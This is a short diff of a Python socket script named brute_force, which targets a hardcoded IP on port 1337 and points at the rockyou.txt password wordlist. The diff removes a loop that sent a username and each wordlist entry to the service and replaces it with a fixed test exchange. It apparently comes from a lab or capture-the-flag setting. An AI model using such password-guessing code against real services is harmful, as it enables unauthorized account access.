@@ -27,7 +27,7 @@
 import socket
 
 host = "142.93.136.81" # IP address here
-port = 1337 # Port here
+port =  1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
 def brute_force():
@@ -63,13 +63,16 @@ def brute_force():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host,port))
 
-    with open(wordlist) as file:
-        for line in file:
-            
-            s.send(username + '\n')
-            s.send(line + '\n')
+    data = s.recv(1024)
+    print(data)
+    s.send("username" + '\n')
+    data = s.recv(1024)
+    print(data)
+    s.send("hello" + '\n')
+    data = s.recv(1024)
+    print(data)
 
-            
+ 
 
     s.close()
 
